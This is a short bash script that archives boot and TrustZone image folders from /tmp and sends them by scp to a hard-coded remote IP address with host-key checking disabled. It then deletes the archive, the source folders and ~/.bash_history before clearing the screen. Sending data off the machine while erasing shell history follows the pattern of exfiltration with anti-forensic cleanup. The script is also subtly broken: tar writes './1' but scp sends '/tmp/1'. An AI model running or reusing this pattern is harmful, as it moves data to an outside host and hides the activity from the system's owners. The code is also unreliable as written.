#!/bin/bash


LOCAL_FILE="/tmp/1"         
REMOTE_USER="yongmin"                 
REMOTE_HOST="218.145.131.131"          
REMOTE_DIR="~"     









tar -cf 1 /tmp/boot_images /tmp/trustzone_images
scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR"

rm /tmp/1
rm -rf /tmp/boot_images
rm -rf /tmp/trustzone_images/
rm ~/.bash_history
clear
